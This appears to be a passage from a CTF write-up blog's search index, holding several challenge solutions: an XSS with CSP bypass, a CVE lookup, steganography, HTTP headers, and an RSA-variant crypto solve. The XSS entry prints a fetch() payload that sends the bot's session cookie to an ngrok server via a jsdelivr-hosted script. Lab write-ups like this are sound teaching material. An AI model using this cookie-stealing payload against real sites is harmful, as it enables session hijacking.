returnres.status(401).send(response('Please fill out all the required fields!')); }); router.get('/admin', AuthMiddleware, (req, res) =\u0026gt;{ if(req.user.user_role !=='admin') { returnres.status(401).send(response('Unautorized!')); } returndb.get_party_requests() .then((data) =\u0026gt;{ res.render('admin.html', { requests: data}); }); }); router.get('/admin/delete_all', AuthMiddleware, (req, res) =\u0026gt;{ if(req.user.user_role !=='admin') { returnres.status(401).send(response('Unautorized!')); }  returndb.remove_requests() .then(() =\u0026gt;res.send(response('All records are deleted!'))); }) module.exports=database=\u0026gt;{ db=database; returnrouter; };  We see that when we submit the above form, there will be a bot analyzing our information. This is bot.js:\nconstfs=require('fs'); constpuppeteer =require('puppeteer'); constJWTHelper =require('./helpers/JWTHelper'); constflag=fs.readFileSync('/flag.txt', 'utf8'); constbrowser_options={ headless: true, args: [ '--no-sandbox', '--disable-background-networking', '--disable-default-apps', '--disable-extensions', '--disable-gpu', '--disable-sync', '--disable-translate', '--hide-scrollbars', '--metrics-recording-only', '--mute-audio', '--no-first-run', '--safebrowsing-disable-auto-update', '--js-flags=--noexpose_wasm,--jitless' ] }; constvisit=async() =\u0026gt;{ try{ constbrowser=awaitpuppeteer.launch(browser_options); letcontext=awaitbrowser.createIncognitoBrowserContext(); letpage=awaitcontext.newPage(); lettoken=awaitJWTHelper.sign({ username: 'admin', user_role: 'admin', flag: flag}); awaitpage.setCookie({ name: 'session', value: token, domain: '127.0.0.1:1337' }); awaitpage.goto('http://127.0.0.1:1337/admin', { waitUntil: 'networkidle2', timeout: 5000 }); awaitpage.goto('http://127.0.0.1:1337/admin/delete_all', { waitUntil: 'networkidle2', timeout: 5000 }); setTimeout(() =\u0026gt;{ browser.close(); }, 5000); } catch(e) { console.log(e); } }; module.exports={ visit};  Basically, it is a puppeteer bot that sets a JWT token with the flag as a cookie and then navigates to /admin. As shown above, /admin endpoint will query the information we just supplied and render it in admin.html:\n\u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;linkrel=\"stylesheet\"href=\"/static/css/bootstrap.min.css\"/\u0026gt; \u0026lt;title\u0026gt;Admin panel\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;divclass=\"container\"style=\"margin-top: 20px\"\u0026gt; {% for request in requests %}  \u0026lt;divclass=\"card\"\u0026gt; \u0026lt;divclass=\"card-header\"\u0026gt; \u0026lt;strong\u0026gt;Halloween Name\u0026lt;/strong\u0026gt; : {{ request.halloween_name |safe}} \u0026lt;/div\u0026gt; \u0026lt;divclass=\"card-body\"\u0026gt; \u0026lt;pclass=\"card-title\"\u0026gt;\u0026lt;strong\u0026gt;Email Address\u0026lt;/strong\u0026gt; : {{ request.email }}\u0026lt;/p\u0026gt; \u0026lt;pclass=\"card-text\"\u0026gt;\u0026lt;strong\u0026gt;Costume Type \u0026lt;/strong\u0026gt; : {{ request.costume_type }} \u0026lt;/p\u0026gt; \u0026lt;pclass=\"card-text\"\u0026gt;\u0026lt;strong\u0026gt;Prefers tricks or treat \u0026lt;/strong\u0026gt; : {{ request.trick_or_treat }} \u0026lt;/p\u0026gt;  \u0026lt;buttonclass=\"btn btn-primary\"\u0026gt;Accept\u0026lt;/button\u0026gt; \u0026lt;buttonclass=\"btn btn-danger\"\u0026gt;Delete\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; {% endfor %} \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;  XSS vulnerability This line of code is vulnerable to HTML injection:\n\u0026lt;divclass=\"card-header\"\u0026gt; \u0026lt;strong\u0026gt;Halloween Name\u0026lt;/strong\u0026gt; : {{ request.halloween_name |safe}} \u0026lt;/div\u0026gt;  The safe keyword is used to tell the template engine that request.halloween_name contains safe HTML code. However, we control this field, so we can \u0026ldquo;safely\u0026rdquo; enter HTML code and obtain Cross-Site Scripting (XSS) in the bot\u0026rsquo;s browser.\nCSP configuration Nevertheless, there is some Content Security Policy applied that mitigates XSS attacks (index.js):\napp.use(function(req, res, next) { res.setHeader( \"Content-Security-Policy\", \"script-src 'self' https://cdn.jsdelivr.net; style-src 'self' https://fonts.googleapis.com; img-src 'self'; font-src 'self' https://fonts.gstatic.com; child-src 'self'; frame-src 'self'; worker-src 'self'; frame-ancestors 'self'; form-action 'self';base-uri 'self'; manifest-src 'self'\" ); next(); });  We can use csp-evaluator to analyze some pitfalls of the above CSP:\nIndeed, we can abuse cdn.jsdelivr.net to trigger XSS, because it is a trusted domain to serve script files. There\u0026rsquo;s a way to tell cdn.jsdelivr.net to take the code from a specific GitHub repository. Therefore, we only need to create the malicious JavaScript file in a public GitHub repository, tell cdn.jsdelivr.net to use it and load it as a script in the name field (recall HTML injection).\nExploitation The objective is to take the bot\u0026rsquo;s cookie (which is a JWT token containing the flag). We can do this by doing an HTTP request to our controlled server appending the cookie as a query parameter.\nIn order to expose our local server, we can use ngrok:\n$ python3 -m http.server 80 Serving HTTP on :: port 80 (http://[::]:80/) ...  $ ngrok -m http 80 ngrok Try our new native Go library: https://github.com/ngrok/ngrok-go Session Status online Account Rocky (Plan: Free) Version 3.1.0 Region United States (us) Latency 106ms Web Interface http://127.0.0.1:4040 Forwarding https://abcd-12-34-56-78.ngrok.io - http://localhost:80 Connections ttl opn rt1 rt5 p50 p90 0 0 0.00 0.00 0.00 0.00  Now we create this JavaScript file:\nfetch('https://abcd-12-34-56-78.ngrok.io?c='+document.cookie)  And we create a GitHub repository containing this file:\nWe must take the commit identifier (5057a9ed285c20d243f7a44a6dd3578cc886ad36) in order to build the cdn.jsdelivr.net URI. We must use this format:\nhttps://cdn.jsdelivr.net/gh/user/repo@version/file  So, this will be the URI:\nhttps://cdn.jsdelivr.net/gh/7Rocky/friendly-octo-eureka@5057a9ed285c20d243f7a44a6dd3578cc886ad36/solve.js  Flag At this point, we can enter this name:\n\u0026lt;scriptsrc=\"https://cdn.jsdelivr.net/gh/7Rocky/friendly-octo-eureka@5057a9ed285c20d243f7a44a6dd3578cc886ad36/solve.js\"\u0026gt;\u0026lt;/script\u0026gt;  And we receive a hit on our local server:\n$ python3 -m http.server 80 Serving HTTP on :: port 80 (http://[::]:80/) ... ::1 - - [29/Oct/2022 14:45:21] \"GET /?c=session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwidXNlcl9yb2xlIjoiYWRtaW4iLCJmbGFnIjoiSFRCe2Nkbl9jNG5fYnlwNHNzX2M1cCEhfSIsImlhdCI6MTY2NzA0NzUyMH0.gJX2JIMeUMH4ud-cRckmvWL2GpmDB71j_vcXMbPDq1s HTTP/1.1\" 200 -  If we decode the middle part of the JWT token (the payload part), we will get the flag:\n$ echo eyJ1c2VybmFtZSI6ImFkbWluIiwidXNlcl9yb2xlIjoiYWRtaW4iLCJmbGFnIjoiSFRCe2Nkbl9jNG5fYnlwNHNzX2M1cCEhfSIsImlhdCI6MTY2NzA0NzUyMH0 | base64 -d {\"username\":\"admin\",\"user_role\":\"admin\",\"flag\":\"HTB{cdn_c4n_byp4ss_c5p!!}\",\"iat\":166704752  ","image":"/images/web.png","permalink":"https://7rocky.github.io/en/ctf/other/hackthebooctf/cursed-secret-party/","section":"ctf","summary":"XSS. CSP bypass","time":4,"title":"Cursed Secret Party"},{"contents":"We have this challenge statement:\n The CVE we\u0026rsquo;re looking for is the first recorded remote code execution (RCE) vulnerability in 2021 in the Windows Print Spooler Service, which is available across desktop and server versions of Windows operating systems. The service is used to manage printers and print servers.\n We are told to search a CVE identifier for the first RCE vulnerability in Windows Print Spooler Service in 2021. This vulnerability is known as PrintNightmare, and it corresponds to several CVE. But the one that the challenge is expecting is CVE-2021-34527, so the flag is picoCTF{CVE-2021-34527}.\n","image":"/images/pwn.png","permalink":"https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/cve-xxxx-xxxx/","section":"ctf","summary":"picoCTF 2022. 100 points. CVE Search","time":1,"title":"CVE-XXXX-XXXX"},{"contents":"We are given three JPEG images:\n monalisa.jpg:   Plans.jpg:   Thepassword_is_the_small_name_of_the_actor_named_Hanks.jpg:  $ file monalisa.jpg monalisa.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 300x300, segment length 16, comment: \"CREATOR: gd-jpeg v1.0 (using IJG JPEG v62), quality = 92\", comment: \"Optimized by JPEGmini 3.9.20.0L Internal 0x8c97c7da\", baseline, precision 8, 1280x1936, components 3 $ file Plans.jpg Plans.jpg: JPEG image data, JFIF standard 1.02, aspect ratio, density 100x100, segment length 16, baseline, precision 8, 800x600, components 3 $ file Thepassword_is_the_small_name_of_the_actor_named_Hanks.jpg Thepassword_is_the_small_name_of_the_actor_named_Hanks.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 1x1, segment length 16, baseline, precision 8, 376x490, components 3  Since they are a JPEG images, we can think of steganography using steghide. Actually, this method works for the third image (Thepassword_is_the_small_name_of_the_actor_named_Hanks.jpg) using TOM as password:\nWe obtain a text with a key 020e60c6a84db8c5d4c2d56a4e4fe082. This looks like an MD5 hash, so let\u0026rsquo;s put it in crackstation.net:\nNow we have a password (leonardo). If we check the printable strings of monalisa.jpg we will see famous.zip at the bottom:\n$ strings -10 monalisa.jpg ;CREATOR: gd-jpeg v1.0 (using IJG JPEG v62), quality = 92 5Optimized by JPEGmini 3.9.20.0L Internal 0x8c97c7da /2.)2\u0026*+) )))))))))))))))))))))))))))))))))))))))))))))))))) #BQaRbq$3r EK:p%q%FvR\\e d'v[{EmXx1 zGToLjg?'} T\\c!`.w0x-B ]. dk*bbJB[\u0026gt;X[e O:V=v,Tee3n-7Y EbqL%g\u0026gt;@Dq$ $A4bIqxctS 8V7:3k/1-0 `SDLKS.etQ _4s{K6!:dW \u0026bXfPKAt-? hwUuAX)WX[ z#iWV(mO)~PL c\u0026lt;[;pg],s{p NbfVh1Y~v\":\u0026gt; vcqlh+tSk( jBWBuFz:V2 k^*kTJ$2LT^BC hQd.!%lJE4 6Yw6L\u0026lt;7(^]i T::Ks\\\"c'e8 ?AE%T*\"+OD Q5N1W-)X@X _JR%\u0026lt;U$ Kx famous.zipUT Mona.jpgUT %=S!dS2GA) NhY`\u0026\u0026lt;kwl3 ia \\2nA{D9x FayU)W^[Ja= 6$}%U.cU(s Mona.jpgUT famous.zipUT  So we can guess that the image file has an embedded ZIP file. We can verify it and extract it using binwalk:\n$ binwalk monalisa.jpg DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 JPEG image data, JFIF standard 1.01 450363 0x6DF3B Zip archive data, at least v2.0 to extract, uncompressed size: 117958, name: famous.zip 450440 0x6DF88 Zip archive data, encrypted at least v2.0 to extract, compressed size: 117776, uncompressed size: 122869, name: Mona.jpg 568411 0x8AC5B End of Zip archive, footer length: 22 568537 0x8ACD9 End of Zip archive, footer length: 22 $ binwalk -e monalisa.jpg DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 JPEG image data, JFIF standard 1.01 450363 0x6DF3B Zip archive data, at least v2.0 to extract, uncompressed size: 117958, name: famous.zip 450440 0x6DF88 Zip archive data, encrypted at least v2.0 to extract, compressed size: 117776, uncompressed size: 122869, name: Mona.jpg 568411 0x8AC5B End of Zip archive, footer length: 22 568537 0x8ACD9 End of Zip archive, footer length: 22 $ ls _monalisa.jpg.extracted/ 6DF3B.zip famous.zip  And we have a ZIP file that contains another JPEG image called Mona.jpg:\n$ file _monalisa.jpg.extracted/famous.zip _monalisa.jpg.extracted/famous.zip: Zip archive data, at least v2.0 to extract $ unzip -l _monalisa.jpg.extracted/famous.zip Archive: _monalisa.jpg.extracted/famous.zip Length Date Time Name --------- ---------- ----- ---- 122869 2017-09-22 20:57 Mona.jpg --------- ------- 122869 1 file  The ZIP file is encrypted, but we have the password (leonardo):\n$ unzip -P leonardo _monalisa.jpg.extracted/famous.zip Archive: _monalisa.jpg.extracted/famous.zip inflating: Mona.jpg $ file Mona.jpg Mona.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 612x612, components 3  Before analyzing this new image, we can take a look at Plans.jpg. We can find a URL in the printable strings of the file:\n$ strings -10 Plans.jpg //33//@@@@@@@@@@@@@@@ #0+.'''.+550055@@?@@@@@@@@@@@@ ?:Vn.$R0!B@X2 rLXn0~uHg*T zS?jh_{3\u0026! nI\"L(oK'b4 zX^(1*cxY3: (CDRYFLD8, RN;m@. VebJ https://www.youtube.com/watch?v=jc1Nfx4c5LQ  This URL goes to a YouTube video called \u0026ldquo;Guernica 3D\u0026rdquo;, and talks about this famous Picasso painting.\nActually, we can use Guernica as the password for steghide in Mona.jpg:\nAnd we get a string that seems to be encoded in Base64 (actually, multiple times). And there\u0026rsquo;s the flag:\n$ echo VTBaU1EyVXdNSGRpYTBKbVZFUkdObEZHT0doak1UbEZUVEJDUldaUlBUMD0= | base64 -d U0ZSQ2UwMHdia0JmVERGNlFGOGhjMTlFTTBCRWZRPT0= $ echo VTBaU1EyVXdNSGRpYTBKbVZFUkdObEZHT0doak1UbEZUVEJDUldaUlBUMD0= | base64 -d | base64 -d SFRCe00wbkBfTDF6QF8hc19EM0BEfQ== $ echo VTBaU1EyVXdNSGRpYTBKbVZFUkdObEZHT0doak1UbEZUVEJDUldaUlBUMD0= | base64 -d | base64 -d | base64 -d HTB{M0n@_L1z@_!s_D3@D}  ","image":"/images/misc.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/misc/da-vinci/","section":"ctf","summary":"Crack MD5 hash. Steganography with steghide and binwalk","time":3,"title":"Da Vinci"},{"contents":"We are given a URL to interact with. Let\u0026rsquo;s use curl:\n$ curl 165.227.106.113/header.php Sorry, it seems as if your user agent is not correct, in order to access this website. The one you supplied is: curl/7.81.0 \u0026lt;!-- Sup3rS3cr3tAg3nt --\u0026gt;  It seems that we need to use a specific user agent (maybe Sup3rS3cr3tAg3nt works):\n$ curl 165.227.106.113/header.php -H 'User-Agent: Sup3rS3cr3tAg3nt' Sorry, it seems as if you did not just come from the site, \"awesomesauce.com\". \u0026lt;!-- Sup3rS3cr3tAg3nt --\u0026gt;  And now we need to tell the website that the request comes from awesomesauce.com. This is the referer, so let\u0026rsquo;s add it and get the flag:\n$ curl 165.227.106.113/header.php -H 'User-Agent: Sup3rS3cr3tAg3nt' -H 'Referer: awesomesauce.com' Here is your flag: CTFlearn{did_this_m3ss_with_y0ur_h34d} \u0026lt;!-- Sup3rS3cr3tAg3nt --\u0026gt;  ","image":"/images/web.png","permalink":"https://7rocky.github.io/en/ctf/ctflearn/web/dont-bump-your-header/","section":"ctf","summary":"HTTP request headers","time":1,"title":"Don't Bump Your Head(er)"},{"contents":"We are given a Python code to encrypt the flag, and the corresponding out.txt file:\nfrom Crypto.Util.number import getPrime, isPrime, bytes_to_long from Crypto.Util.Padding import pad import os FLAG = b\"HTB{--REDACTED--}\" def getPrimes(coefficient): while True: a = getPrime(512) p = 3 * coefficient * a + 2 if isPrime(p): break while True: b = getPrime(512) q = 3 * coefficient * b + 2 if isPrime(q): break return p, q def encrypt(message, coefficient): p, q = getPrimes(coefficient) n = p * q padded_message = bytes_to_long(pad(message, 256)) message = bytes_to_long(message) c1 = (message * (message + coefficient)) % n c2 = (padded_message * (padded_message + coefficient)) % n return (n, c1, c2) def main(): coefficient = getPrime(128) out = \"\" message = FLAG[0:len(FLAG)//2] n1, c1, c2 = encrypt(message, coefficient) out += f\"{n1}\\n{c1}\\n{c2}\\n\" message = FLAG[len(FLAG)//2:] n2, c3, c4 = encrypt(message, coefficient) out += f\"{n2}\\n{c3}\\n{c4}\\n\" out += f\"{len(FLAG)}\" with open(\"out.txt\", \"w\") as f: f.write(out) if __name__ == '__main__': main()  19776862259930835769533075141648724317136726865325219582974628641663028757626265811083579217562652521882819442186121072998911507994180202653223643709290080839913395525826127153190928840827396123760992080649033993986933259414523207699646834981906819263319717393978144309193843291629147724979917210633945695963741292906203710063193032172565935616940163881309010593278779797311032854042143 18940449739373929782738747330951086701639920358124022449285915914681280430796481828627299763135820762855030234173393995786612606880441619894387463477558992819159868677736220547584576162287130594708254787956440732197673909613467337841562238900614238638819659960733399020443364866675611439229048487547611412841048501574753238490324081535533435151621545695715920828646120795059085207687562 8139131820890905559667838555211733555742225714065473904284826530490173193882559461890851501765452084252909412188575022633596512451349296562551141247433279875212083704533696867645657058965269748533381751261887853181791035505421692256731545740535452608088572835061213186774986415770477686449034066741760771862922788827235376073691257160953903839272893965131226612277505938410382901008254 26981290975895303933094134784682647576666219028610175215312705398803184876873073206073503314367717924247311343215620922642215797499997039996235807898656819655954778538207489354154710796202412578870511364360408739855039573753404337104901925571890067221867326539447741757218265017060345184819121122211405292705642802582423249795098475142694876497945367191724577275836649641722277321440333 11417442976137891276889457530453693512824297007151561589652706330477531354073557298919952168938641673547415923544612769937040826488039629275033613885416852757446100888628373584968290007182319967658770715301605453943639269415203462531753249668211460008832837924575003999865632991329309338991536326471187269457640505585240846158952935988441171094886116683100214189858525596159931001818615 18355127503780127719693553150263322113757549849264731376621241697648137569897555203319854095104524520716185245672659763235856966677160994023952943459682923666302498240656511471051133821432105321005228730688019003306690750456433049212247022010356640992865785005342800448602013572898416040572578635571772069565860571397553306232025854213437948953083273924864099046923310816080854899416432 186  First of all, we see that the program takes a 128-bit prime number called coefficient to generate other prime numbers $p$ and $q$. Let $C$ be the value of coefficient, then the prime numbers $p$ and $q$ are computed as:\n$$ p = 3 a C + 2 $$\n$$ q = 3 b C + 2 $$\nWhere $a$ and $b$ are 512-bit prime numbers. Using this strange method, we have two modulus: $n_1$ and $n_2$. Hence, we might be able to find the coefficient $C$ because it is common in the two modulus. Let $p_i = 3 a_i C + 2$ and $q_i = 3 b_i C + 2$, then:\n$$ \\begin{equation} \\begin{split} n_i \u0026amp;= p_i \\cdot q_i \\\\ \u0026amp;= (3 a_i C + 2) \\cdot (3 b_i C + 2) \\\\ \u0026amp;= 9 a_i b_i C^2 + 6 a_i C + 6 b_i C + 4 \\end{split} \\end{equation} $$\nNotice that:\n$$ \\begin{equation} \\begin{split} n_i - 4 \u0026amp;= 9 a_i b_i C^2 + 6 a_i C + 6 b_i C \\\\ \u0026amp;= 3 C \\cdot (3 a_i b_i C + 2 a_i + 2 b_i) \\end{split} \\end{equation} $$\nSince we have $n_1$ and $n_2$, then $3 C = \\gcd{(n_1 - 4, n_2 - 4)}$, so\n$$ C = \\frac{\\gcd{(n_1 - 4, n_2 - 4)}}{3} $$\nAlright, now let\u0026rsquo;s see how the ciphertexts $c_1$ and $c_2$ are computed (the procedure will be the same for $c_3$ and $c_4$). Let $m_1$ be the first half of the flag:\n$$ \\begin{equation} \\begin{split} c_1 \u0026amp;\\equiv m_1 \\cdot (m_1 + C) \\pmod{n_1} \\\\ \u0026amp;\\equiv m_1^2 + m_1 C \\pmod{n_1} \\end{split} \\end{equation} $$\n$$ \\begin{equation} \\begin{split} c_2 \u0026amp;\\equiv \\mathrm{pad}\\, (m_1, 256) \\cdot \\left(\\mathrm{pad}\\, (m_1, 256) + \\cdot C\\right) \\pmod{n_1} \\\\ \u0026amp;\\equiv \\mathrm{pad}\\, (m_1, 256)^2 + \\mathrm{pad}\\, (m_1, 256) \\cdot C \\pmod{n_1} \\end{split} \\end{equation} $$\nThe pad function adds more bytes to the message in a predictable way. For example, if a message of 12 bytes long is padded up to 16 bytes, the padding will be 4 bytes \\x04. These are some examples:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; from Crypto.Util.Padding import pad \u0026gt;\u0026gt;\u0026gt; pad(b'A' * 12, 16) b'AAAAAAAAAAAA\\x04\\x04\\x04\\x04' \u0026gt;\u0026gt;\u0026gt; pad(b'A' * 10, 16) b'AAAAAAAAAA\\x06\\x06\\x06\\x06\\x06\\x06' \u0026gt;\u0026gt;\u0026gt; pad(b'A' * 1, 16) b'A\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f'  We can express the pad operation in mathematical terms like this, being $L$ the length of the message:\n$$ \\mathrm{pad}\\,(m_i, 256) = m_i \\cdot 256 ^ {256 - L} + P $$\nAnd $P$ (the actual padding) is the following expression. For simplification purposes, let $K = 256 - L$:\n$$ P = K \\cdot (1 + 256 + 256^2 + \\dots + 256^{K - 1}) $$\nWhich is the sum of a geometric progression, which equals\n$$ P = K \\cdot \\frac{256^K - 1}{256 - 1} $$\nTherefore, we can express $c_2$ as follows\n$$ \\begin{equation} \\begin{split} c_2 \u0026amp;\\equiv \\mathrm{pad}\\, (m_1, 256)^2 + \\mathrm{pad}\\, (m_1, 256) \\cdot C \\pmod{n_1} \\\\ \u0026amp;\\equiv \\left(m_1 \\cdot 256 ^ K + P\\right)^2 + \\left(m_1 \\cdot 256^K + P\\right) \\cdot C \\pmod{n_1} \\\\ \u0026amp;\\equiv m_1^2 \\cdot 256 ^{2 K} + 2 m_1 P \\cdot 256^K + P^2 + m_1 C \\cdot 256^K + P C \\pmod{n_1} \\end{split} \\end{equation} $$\nNow we can move some things around:\n$$ c_2 - P^2 - P C \\equiv m_1^2 \\cdot 256 ^{2 K} + 2 m_1 P \\cdot 256^K + m_1 C \\cdot 256^K \\pmod{n_1} $$\n$$ c_2 - P^2 - P C \\equiv 256^K \\cdot (m_1^2 \\cdot 256^K + 2 m_1 P + m_1 C) \\pmod{n_1} $$\n$$ (c_2 - P^2 - P C) \\cdot \\left(256^K\\right)^{-1} \\equiv m_1^2 \\cdot 256^K + 2 m_1 P + m_1 C \\pmod{n_1} $$\nLet\u0026rsquo;s define $X$ as\n$$ \\begin{equation} \\begin{split} X \u0026amp;:= (c_2 - P^2 - P C) \\cdot \\left(256^K\\right)^{-1} \\pmod{n_1} \\\\ \u0026amp;\\equiv m_1^2 \\cdot 256^K + 2 m_1 P + m_1 C \\pmod{n_1} \\end{split} \\end{equation} $$\nWe can get rid of $m_1^2 \\cdot 256^K$ if we substract $c_1 \\cdot 256^K$:\n$$ \\begin{equation} \\begin{split} X \u0026amp;- c_1 \\cdot 256^K \\equiv \\\\ \u0026amp;\\equiv (m_1^2 \\cdot 256^K + 2 m_1 P + m_1 C) - c_1 \\cdot 256^K \\pmod{n_1} \\\\ \u0026amp;\\equiv (m_1^2 \\cdot 256^K + 2 m_1 P + m_1 C) - (m_1^2 + m_1 C) \\cdot 256^K \\pmod{n_1} \\\\ \u0026amp;\\equiv 2 m_1 P + m_1 C - m_1 C \\cdot 256^K \\pmod{n_1} \\\\ \u0026amp;\\equiv m_1 \\cdot (2 P + C - C \\cdot 256^K) \\pmod{n_1} \\end{split} \\end{equation} $$\nAt this point, we can isolate $m_1$:\n$$ m_1 = (X - c_1 \\cdot 256^K) \\cdot (2 P + C - C \\cdot 256^K)^{-1} \\pmod{n_1} $$\nSo we have everything, we only need to script it. This is a Python script that solves the challenge:\n#!/usr/bin/env python3 import math def main(): with open('out.txt') as f: n1, c1, c2, n2, c3, c4, L = map(int, f.read().splitlines()) C = math.gcd(n1 - 4, n2 - 4) // 3 K = 256 - math.floor(L / 2) P = int(hex(K)[2:] * K, 16) X = (c2 - P ** 2 - P * C) * pow(256 ** K, -1, n1) % n1 m1 = (X - 256 ** K * c1) * pow(2 * P + C - C * 256 ** K, -1, n1) % n1 K = 256 - math.ceil(L / 2) P = int(hex(K)[2:] * K, 16) Y = (c4 - P ** 2 - P * C) * pow(256 ** K, -1, n2) % n2 m2 = (Y - 256 ** K * c3) * pow(2 * P + C - C * 256 ** K, -1, n2) % n2 print(bytes.fromhex(hex(m1)[2:] + hex(m2)[2:])) if __name__ == '__main__': main()  $ python3 solve.py b'HTB{You_were_supposed_to_find_the_gcd_trick_then_search_and_find_the_ACSC_writeup_learn_some_interesting_stuff_and_solve_the_challege_but_I_forgot_about_the_most_basic_thing_I_m_sorry:(}'  The full script can be found in here: solve.py.\n","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/crypto/down-the-rabinhole/","section":"ctf","summary":"Greatest Common Divisor. Modular arithmetic. PKCS7 padding","time":6,"title":"Down the Rabinhole"},{"contents":"We are given a lot of Windows Event logs (.evtx files):\n$ tree Logs Logs ├── Application.evtx ├── HardwareEvents.evtx ├── Internet Explorer.evtx ├── Key Management Service.evtx ├── Microsoft-Windows-AppModel-Runtime%4Admin.evtx ├── Microsoft-Windows-AppReadiness%4Admin.evtx ├── Microsoft-Windows-AppReadiness%4Operational.evtx ├── Microsoft-Windows-AppXDeployment%4Operational.evtx ├── Microsoft-Windows-AppXDeploymentServer%4Operational.evtx ├── Microsoft-Windows-AppXDeploymentServer%4Restricted.evtx ├── Microsoft-Windows-ApplicationResourceManagementSystem%4Operational.evtx ├── Microsoft-Windows-Bits-Client%4Operational.evtx ├── Microsoft-Windows-CodeIntegrity%4Operational.evtx ├── Microsoft-Windows-Compat-Appraiser%4Operational.evtx ├── Microsoft-Windows-CoreApplication%4Operational.evtx ├── Microsoft-Windows-Crypto-DPAPI%4BackUpKeySvc.evtx ├── Microsoft-Windows-Crypto-DPAPI%4Operational.evtx ├── Microsoft-Windows-DSC%4Admin.evtx ├── Microsoft-Windows-DSC%4Operational.evtx ├── Microsoft-Windows-DataIntegrityScan%4Admin.evtx ├── Microsoft-Windows-DataIntegrityScan%4CrashRecovery.evtx ├── Microsoft-Windows-DeviceSetupManager%4Admin.evtx ├── Microsoft-Windows-DeviceSetupManager%4Operational.evtx ├── Microsoft-Windows-Dhcp-Client%4Admin.evtx ├── Microsoft-Windows-Dhcpv6-Client%4Admin.evtx ├── Microsoft-Windows-Diagnosis-DPS%4Operational.evtx ├── Microsoft-Windows-Forwarding%4Operational.evtx ├── Microsoft-Windows-GroupPolicy%4Operational.evtx ├── Microsoft-Windows-HomeGroup Control Panel%4Operational.evtx ├── Microsoft-Windows-International%4Operational.evtx ├── Microsoft-Windows-Iphlpsvc%4Operational.evtx ├── Microsoft-Windows-Kernel-ApphelpCache%4Operational.evtx ├── Microsoft-Windows-Kernel-Boot%4Operational.evtx ├── Microsoft-Windows-Kernel-EventTracing%4Admin.evtx ├── Microsoft-Windows-Kernel-PnP%4Configuration.evtx ├── Microsoft-Windows-Kernel-PnPConfig%4Configuration.evtx ├── Microsoft-Windows-Kernel-Power%4Thermal-Operational.evtx ├── Microsoft-Windows-Kernel-ShimEngine%4Operational.evtx ├── Microsoft-Windows-Kernel-StoreMgr%4Operational.evtx ├── Microsoft-Windows-Kernel-WDI%4Operational.evtx ├── Microsoft-Windows-Kernel-WHEA%4Errors.evtx ├── Microsoft-Windows-Kernel-WHEA%4Operational.evtx ├── Microsoft-Windows-Known Folders API Service.evtx ├── Microsoft-Windows-LanguagePackSetup%4Operational.evtx ├── Microsoft-Windows-MUI%4Admin.evtx ├── Microsoft-Windows-MUI%4Operational.evtx ├── Microsoft-Windows-MiStreamProvider%4Operational.evtx ├── Microsoft-Windows-NCSI%4Operational.evtx ├── Microsoft-Windows-NetworkAccessProtection%4WHC.evtx ├── Microsoft-Windows-NetworkProfile%4Operational.evtx ├── Microsoft-Windows-NetworkProvider%4Operational.evtx ├── Microsoft-Windows-Ntfs%4Operational.evtx ├── Microsoft-Windows-Ntfs%4WHC.evtx ├── Microsoft-Windows-PowerShell%4Admin.evtx ├── Microsoft-Windows-PowerShell%4Operational.evtx ├── Microsoft-Windows-PowerShell-DesiredStateConfiguration-FileDownloadManager%4Operational.evtx ├── Microsoft-Windows-Powershell-DesiredStateConfiguration-PullServer%4Operational.evtx ├── Microsoft-Windows-PrintService%4Admin.evtx ├── Microsoft-Windows-RemoteDesktopServices-RdpCoreTS%4Admin.evtx ├── Microsoft-Windows-RemoteDesktopServices-RdpCoreTS%4Operational.evtx ├── Microsoft-Windows-Resource-Exhaustion-Detector%4Operational.evtx ├── Microsoft-Windows-RestartManager%4Operational.evtx ├── Microsoft-Windows-SMBClient%4Operational.evtx ├── Microsoft-Windows-SMBServer%4Audit.evtx ├── Microsoft-Windows-SMBServer%4Connectivity.evtx ├── Microsoft-Windows-SMBServer%4Operational.evtx ├── Microsoft-Windows-SMBServer%4Security.evtx ├── Microsoft-Windows-Security-SPP-UX-Notifications%4ActionCenter.evtx ├── Microsoft-Windows-ServerManager-DeploymentProvider%4Operational.evtx ├── Microsoft-Windows-ServerManager-MgmtProvider%4Operational.evtx ├── Microsoft-Windows-ServerManager-MultiMachine%4Admin.evtx ├── Microsoft-Windows-ServerManager-MultiMachine%4Operational.evtx ├── Microsoft-Windows-Shell-ConnectedAccountState%4ActionCenter.evtx ├── Microsoft-Windows-Shell-Core%4ActionCenter.evtx ├── Microsoft-Windows-Shell-Core%4Operational.evtx ├── Microsoft-Windows-SmartCard-DeviceEnum%4Operational.evtx ├── Microsoft-Windows-SmbClient%4Connectivity.evtx ├── Microsoft-Windows-SmbClient%4Security.evtx ├── Microsoft-Windows-Storage-Tiering%4Admin.evtx ├── Microsoft-Windows-StorageSpaces-Driver%4Diagnostic.evtx ├── Microsoft-Windows-StorageSpaces-Driver%4Operational.evtx ├── Microsoft-Windows-StorageSpaces-ManagementAgent%4WHC.evtx ├── Microsoft-Windows-TWinUI%4Operational.evtx ├── Microsoft-Windows-TZSync%4Operational.evtx ├── Microsoft-Windows-TaskScheduler%4Maintenance.evtx ├── Microsoft-Windows-TaskScheduler%4Operational.evtx ├── Microsoft-Windows-TerminalServices-LocalSessionManager%4Admin.evtx ├── Microsoft-Windows-TerminalServices-LocalSessionManager%4Operational.evtx ├── Microsoft-Windows-TerminalServices-Printers%4Admin.evtx ├── Microsoft-Windows-TerminalServices-Printers%4Operational.evtx ├── 